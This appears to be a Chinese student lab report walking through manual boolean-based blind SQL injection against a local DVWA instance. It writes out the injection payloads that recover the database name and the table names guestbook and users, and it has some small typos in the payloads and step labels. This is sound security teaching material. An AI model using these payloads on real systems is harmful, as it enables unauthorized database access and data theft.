# 软件安全实验12

### 姓名：何叶   学号：2313487   班级：范玲玲班

[TOC]

## 实验名称：SQL手工盲注

## 实验要求：

基于DVWA里的SQL盲注案例，实施手工盲注，参考课本，撰写实验报告。

## 实验原理：

基于DVWA的SQL盲注案例实施手工盲注实验，旨在通过模拟攻击者利用SQL注入漏洞，学习如何通过构造特定的SQL语句，利用程序的响应推断数据库信息。DVWA是一个脆弱的Web应用，用于安全研究和教育，包含多种安全漏洞。实验中，学生将识别SQL注入点，实施基于布尔的盲注，提取数据库信息，并学习如何加固Web应用防止此类攻击。通过实验，学生将提高对Web应用安全的理解和防御能力。

通过DVWA平台的SQL注入案例进行手工盲注实验，目的是推测数据库、表和字段信息。选择DVWA界面左侧的“SQL Injection(Blind)”进入实验环境。


在实验的输入端口，我们需要通过输入字符串，利用系统仅能回答“是”或“否”的特点，逐步套取信息，推断数据库结构。我们将通过提出如“数据库名首字母是否为'd'”这样的问题，逐步揭示所需数据。

## 实验步骤：

### 一、下载OWASP Broken Web Applications

#### 1.官网下载并解压文件

![image-20250528161208091](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528161208091.png)

#### 2.虚拟机打开

![image-20250528161618673](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528161618673.png)

#### 3.输入用户名和密码，ifconfig指令得到网址为192.168.15.129

![image-20250528162050276](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528162050276.png)

#### 4.浏览器打开网址192.168.15.129

![image-20250528162224145](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528162224145.png)

#### 5.点击Damn Vulnerable Web Application,输入用户名和密码admin

![image-20250528162359390](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528162359390.png)

#### 6.进入界面，选择DVMA Security

![image-20250528162425851](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528162425851.png)

#### 7.等级设置为low

![image-20250528162606745](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528162606745.png)

### 二、判断注入类型

#### 1.SQL Injection(Blind)界面输入1

![image-20250528192925234](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528192925234.png)

#### 2.得到查询结果，存在用户

![image-20250528193007509](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193007509.png)

#### 3.输入1' and 1=1 #

单引号为了闭合原来 SQL 语句中的第一个单引号，而后面的#为了闭合后面的单引号

![image-20250528193143749](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193143749.png)

#### 4.得到查询结果



![image-20250528193117431](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193117431.png)

#### 5.输入1' and 1=2 #

![image-20250528193231953](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193231953.png)

#### 6.没有查询结果，说明为字符型

![image-20250528193510813](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193510813.png)

### 三、二分法猜出数据库名

#### 1.输入1' and length(database())=1 #

判断数据库的名字是不是1个字

![image-20250528193450779](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193450779.png)

#### 2.没有输出，名字不是一个字

![image-20250528193510813](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193510813.png)

#### 3.输入length(database())=4 #

![image-20250528193546660](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193546660.png)

#### 4.成功输出，为4个字

![image-20250528193555891](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193555891.png)

#### 5.输入1' and Ascii(Substr(database(),1,1))>97 #

![image-20250528193703059](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193703059.png)

#### 6.成功输出，说明第一个字符Asscii大于97

![image-20250528193713948](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193713948.png)

#### 7.输入1' and Ascii(Substr(database(),1,1))<122 #

![image-20250528193733932](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193733932.png)

#### 8.成功输出，Ascii小于122

![image-20250528193749159](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193749159.png)

#### 9.输入1' and Ascii(Substr(database(),1,1))<109 #

![image-20250528193827333](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193827333.png)

#### 10.成功输出，Ascii小于109

![image-20250528193837939](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193837939.png)

#### 11.输入1' and Ascii(Substr(database(),1,1))<103 #，Ascii小于103



![image-20250528193900229](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193900229.png)

#### 12.Ascii不小于100

![image-20250528193940029](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528193940029.png)



#### 13.Ascii为100

![image-20250528194019717](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528194019717.png)



#### 14.输入1' and Substr(database(),1,1)=‘d’ #



![image-20250528194434248](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528194434248.png)

#### 15.成功输出，说明第一个字为d

![image-20250528194400950](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528194400950.png)

#### 16.输入1' and Substr(database(),2,1)=v’ #

![image-20250528194717642](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528194717642.png)



#### 17.成功输出，说明第二个字为v



![image-20250528194912129](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528194912129.png)

#### 18.输入1' and Substr(database(),3,1)=w’ #

![image-20250528194953173](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528194953173.png)

#### 19.成功输出，说明第三个字为w

![image-20250528195025254](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528195025254.png)

#### 20.输入1' and Substr(database(),4,1)=a’ #

![image-20250528195203848](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528195203848.png)

#### 21.成功输出，说明第三个字为a

![image-20250528195217320](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528195217320.png)

#### 22.综上所述，数据库的名字为dvwa

### 四、盲猜数据库表名字

#### 1.输入1' and (select count(table_name)from information_schema.tables where table_schema=database())=2 #

![image-20250528195431745](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528195431745.png)

#### 2.成功输出，说明数据库有两张表

![image-20250528195703909](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528195703909.png)

#### 3.输入1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #

![image-20250528195954843](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528195954843.png)

#### 4.成功输出，说明第一张表名字有9个字符

![image-20250528200007425](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528200007425.png)

#### 5.输入1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='g' #

#### 6.成功输出，说明第一张表第一个字为g

![image-20250528201135680](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528201135680.png)

#### 7.输入1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='u' #

#### 8.成功输出，说明第一张表第二个字为u

![image-20250528201209295](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528201209295.png)

#### 9.输入1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,9)='guestbook' #

![image-20250528201503534](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528201503534.png)

#### 10.成功输出，说明第一张表叫guestbook

![image-20250528201438284](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528201438284.png)

#### 11.输入1' and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,5)='users' #

![image-20250528201601594](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528201601594.png)

#### 12.成功输出，说明第二张表叫users

![image-20250528201617710](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250528201617710.png)

#### 13.综上所述，数据库有两张表，分别叫guestbook和users

## 心得体会：

通过参与本次软件安全实验，我对SQL注入攻击的原理和防御策略有了更为深刻的认识。在DVWA平台上进行的SQL盲注实验，让我亲身体验了攻击者如何巧妙地利用SQL注入漏洞来推测数据库的结构和敏感信息。实验中，我通过手工构造SQL语句，运用布尔逻辑等技术手段，逐步揭示了数据库名、表名和字段信息，这个过程极大地锻炼了我的逻辑思维和问题解决能力。

实验不仅让我体会到了攻击者获取信息的巧妙手段，也让我深刻认识到Web应用安全防护的重要性。我学到了如何通过输入验证、参数化查询等安全措施来加固Web应用，防止SQL注入攻击，这些知识对于我有重要的意义。
